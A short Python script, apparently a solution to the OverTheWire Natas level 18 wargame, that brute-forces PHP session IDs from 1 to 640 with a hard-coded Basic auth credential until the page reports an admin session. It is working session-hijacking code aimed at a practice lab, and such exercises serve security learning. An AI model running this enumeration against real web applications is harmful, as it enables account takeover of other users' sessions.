import requests
from bs4 import BeautifulSoup

headers = {"Authorization": "Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==", "Cookie": "PHPSESSID="}

for i in range(1, 641):
    req_headers = headers.copy()
    req_headers["Cookie"] += str(i)
    result = requests.get("http://natas18.natas.labs.overthewire.org", headers=req_headers)
    print(f"Try: {i}")
    soup = BeautifulSoup(result.content, "html.parser")
    div = soup.find("div", id="content")
    text = div.get_text()
    print(text)
    if (text.startswith("You are an admin")):
        break